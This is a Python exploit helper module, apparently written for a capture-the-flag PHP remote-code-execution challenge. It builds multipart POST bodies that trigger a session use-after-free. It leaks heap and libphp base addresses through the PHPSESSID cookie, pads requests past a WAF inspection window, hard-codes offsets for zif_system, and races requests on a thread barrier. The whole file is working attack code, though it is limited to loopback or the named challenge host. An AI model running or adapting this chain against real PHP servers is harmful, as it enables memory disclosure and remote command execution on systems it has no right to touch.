#!/usr/bin/env python3
"""Shared builders + transport for the bridge.

The bridge combines three evidence-backed pieces no campaign has run together:

  1. the chain8511 arm (the ONLY producer shape proven to arm the live target)
  2. the pad-free literal consumer (CheapB T2c: 0x20000 window, 40 arrays,
     841 fillers, NO pad -> 131,072-byte cookie with BOTH bases)
  3. held-wave transport (producers staged+released before consumers)

Both arm and consumer are prefixed with the 1,056,768-byte z-preamble, which
is discarded bytes before the first boundary (zero $_POST allocation, no heap
distortion) and carries the literal past the front's ~1 MiB WAF window.
"""
from __future__ import annotations

import concurrent.futures
import hashlib
import json
import os
import re
import socket
import ssl
import sys
import threading
import time
import urllib.parse
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, os.environ.get("P2S_TOOL", "/root/chainetool-v106/e2e"))
sys.path.insert(0, "/root/cfctf-mirror")

from p2s import transplant  # noqa: E402
import chain8511  # noqa: E402

LOOPBACK = {"127.0.0.1", "localhost", "::1"}
LIVE_HOST = "php-rce.cloudflare.app"
LIVE_PATH = "/php/index.php"

PREAMBLE_BYTES = (1 << 20) + 8192   # 1,056,768 B
DTOR = 0x7B47A0                    # zval_ptr_dtor @ libphp+0x7b47a0
ZIF_SYSTEM = 0x5996E0              # zif_system @ libphp+0x5996e0
R0_OFF = 0xA50E0                   # PS(http_session_vars) ref = chunk + 0xa50e0
LOWBITS = (0x0E0,)
ARM_BOUNDARY = b"S" * 17
DISC_BOUNDARY = b"B" * 10
WINDOW = 0x20000
ARRAYS = 40
FILLERS = 841
ARM_LINES = 470000
ARM_PADS = 990


def preamble_pad(body: bytes, size: int = PREAMBLE_BYTES) -> bytes:
    """Inert z-preamble: discarded bytes before the first boundary."""
    return (b"z" * (max(2, int(size)) - 2)) + b"\r\n" + body


def arm_body() -> bytes:
    """chain8511 published-order arm (disclosure substrate: PS(id) dangles)."""
    return chain8511.arm_body(ARM_LINES, ARM_PADS, ARM_BOUNDARY,
                              order="published")


def arm_wire() -> bytes:
    return preamble_pad(arm_body())


def consumer_body() -> bytes:
    """CheapB T2c: pad-free disclosure, 0x20000 window, 40 arrays, 841 fillers."""
    return transplant._parts_to_body(
        transplant._disclosure_parts(WINDOW, ARRAYS, FILLERS), DISC_BOUNDARY)


def consumer_wire() -> bytes:
    return preamble_pad(consumer_body())


def decode_cookie(cookie: bytes) -> dict:
    return transplant.decode(cookie, DTOR)


def strict(cookie: bytes):
    """Return the decode dict iff BOTH bases are present, else None."""
    if not cookie:
        return None
    decoded = transplant.decode(cookie, DTOR)
    if decoded["heap"] and decoded["libphp"]:
        return decoded
    return None


def receive_raw(sock: socket.socket, cap: int = 2 << 20) -> bytes:
    data = bytearray()
    while len(data) < cap:
        try:
            chunk = sock.recv(min(65536, cap - len(data)))
        except (socket.timeout, ssl.SSLError):
            break
        if not chunk:
            break
        data.extend(chunk)
    return bytes(data)


class HeldRequest:
    """Connect and upload everything but the final byte, then finish on a
    barrier. Modeled on the proven cfctf-r8 held-leak transport."""

    def __init__(self, args, body: bytes, boundary: bytes, label: str,
                 extra_headers: dict | None = None) -> None:
        self.args = args
        self.body = body
        self.label = label
        self.started = time.monotonic()
        raw = socket.create_connection((args.host, args.port), args.timeout)
        if args.tls:
            raw = ssl.create_default_context().wrap_socket(
                raw, server_hostname=args.host)
        raw.settimeout(args.timeout)
        self.sock = raw
        host = args.host if args.port in (80, 443) else f"{args.host}:{args.port}"
        extra = "".join(
            f"{name}: {value}\r\n" for name, value in (extra_headers or {}).items())
        head = (
            f"POST {args.path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "User-Agent: cfctf-bridge-held/1\r\n"
            f"{extra}"
            "Content-Type: multipart/form-data; boundary="
            + boundary.decode("ascii")
            + f"\r\nContent-Length: {len(body)}\r\n"
              "Connection: close\r\n\r\n"
        ).encode("ascii")
        self.sock.sendall(head + body[:-1])
        self.last = body[-1:]

    def finish(self, barrier: threading.Barrier) -> dict:
        try:
            barrier.wait(timeout=self.args.timeout)
            self.sock.sendall(self.last)
            raw = receive_raw(self.sock)
            return {
                "label": self.label,
                "raw": raw,
                "elapsed_s": round(time.monotonic() - self.started, 3),
                "request_body_sha256": hashlib.sha256(self.body).hexdigest(),
            }
        except Exception as error:  # transport evidence, never leak evidence
            return {
                "label": self.label,
                "raw": b"",
                "elapsed_s": round(time.monotonic() - self.started, 3),
                "request_body_sha256": hashlib.sha256(self.body).hexdigest(),
                "error": repr(error),
            }
        finally:
            try:
                self.sock.close()
            except OSError:
                pass

    def close(self) -> None:
        try:
            self.sock.close()
        except OSError:
            pass


def release_wave(requests: list[HeldRequest]) -> list[dict]:
    barrier = threading.Barrier(len(requests))
    with concurrent.futures.ThreadPoolExecutor(
        max_workers=len(requests)
    ) as executor:
        futures = [executor.submit(request.finish, barrier)
                   for request in requests]
        return [future.result() for future in futures]


def response_summary(raw: bytes) -> dict:
    if not raw:
        return {"status": 0, "attempt_id": "", "backoff": False, "oom": False}
    head, _, _ = raw.partition(b"\r\n\r\n")
    status = 0
    match = re.match(rb"HTTP/1\.[01] (\d{3})", head)
    if match:
        status = int(match.group(1))
    attempt_id = ""
    match = re.search(rb"(?i)x-attempt-id:\s*([^\r\n]+)", head)
    if match:
        attempt_id = match.group(1).decode("latin1", "replace").strip()
    return {"status": status, "attempt_id": attempt_id,
            "backoff": status in (429, 503),
            "oom": b"Allowed memory size" in raw}


def cookie_from_raw(raw: bytes) -> bytes:
    match = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n;]*?)(?:;|$)", raw)
    if not match:
        return b""
    return urllib.parse.unquote_to_bytes(match.group(1))


def record(row: dict) -> dict:
    raw = row.get("raw") or b""
    summary = response_summary(raw)
    cookie = cookie_from_raw(raw)
    result = {
        "label": row.get("label"),
        "status": summary["status"],
        "elapsed_s": row.get("elapsed_s"),
        "attempt_id": summary["attempt_id"],
        "backoff": summary["backoff"],
        "oom": summary["oom"],
        "raw_bytes": len(raw),
        "response_sha256": hashlib.sha256(raw).hexdigest(),
        "cookie_bytes": len(cookie),
        "cookie_sha256": hashlib.sha256(cookie).hexdigest(),
        "request_body_sha256": row.get("request_body_sha256"),
        "fatal": (b"Possible integer overflow" in raw
                 or b"Fatal error" in raw
                 or b"Allowed memory size" in raw),
        "body_head": raw.partition(b"\r\n\r\n")[2][:260].decode(
            "latin1", "replace"),
    }
    if row.get("error"):
        result["error"] = row["error"]
    return result


def parse_target(parser, args) -> None:
    parsed = urllib.parse.urlsplit(args.target)
    args.host = parsed.hostname or ""
    args.tls = parsed.scheme == "https"
    args.port = parsed.port or (443 if args.tls else 80)
    args.path = parsed.path or "/"
    local = args.host in LOOPBACK and not args.tls
    live = args.host == LIVE_HOST and args.tls and args.path == LIVE_PATH
    if not local and not (live and args.authorized_live):
        parser.error("destination must be loopback or the exact public "
                     "challenge with --authorized-live")
    if args.path != LIVE_PATH:
        parser.error("path must be exactly /php/index.php")
